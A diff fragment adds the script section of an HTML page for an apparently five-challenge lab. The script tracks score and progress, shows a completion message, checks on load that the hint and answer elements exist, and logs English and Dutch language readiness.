+        document.getElementById('score').textContent = totalScore;
+        document.getElementById('completed').textContent = completedChallenges;
+        
+        // Update progress bar
+        const progress = (completedChallenges / 5) * 100;
+        document.getElementById('progressBar').style.width = progress + '%';
+        
+        // Show completion message when all challenges are done
+        if (completedChallenges === 5) {
+          setTimeout(() => {
+            const completion = document.getElementById('completion');
+            if (completion) {
+              completion.style.display = 'block';
+              completion.scrollIntoView({ behavior: 'smooth' });
+            }
+          }, 1000);
+        }
+      }
+    }
+
+    // Test all functions on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      console.log('🔧 Testing all functions...');
+      
+      // Initialize with English
+      setLanguage('en');
+      
+      // Test hint toggles
+      console.log('✅ toggleHint function loaded');
+      console.log('✅ toggleAnswer function loaded');
+      console.log('✅ completeChallenge function loaded');
+      console.log('✅ Language system loaded');
+      
+      // Verify all required elements exist
+      const requiredElements = [
+        'progressBar', 'score', 'completed', 'completion',
+        'hint0-1', 'hint0-2', 'hint0-3', 'answer0',
+        'hint1-1', 'hint1-2', 'hint1-3', 'answer1',
+        'hint2-1', 'hint2-2', 'hint2-3', 'answer2',
+        'hint3-1', 'hint3-2', 'hint3-3', 'answer3',
+        'hint4-1', 'hint4-2', 'hint4-3', 'hint4-4', 'answer4'
+      ];
+      
+      requiredElements.forEach(id => {
+        const element = document.getElementById(id);
+        if (element) {
+          console.log(`✅ Found element: ${id}`);
+        } else {
+          console.error(`❌ Missing element: ${id}`);
+        }
+      });
+      
+      console.log('🚀 Lab ready for testing!');
+      console.log('🇳🇱 Nederlandse taal beschikbaar!');
+    });
+  </script>
 </body>
-
-</html>
+</html> 
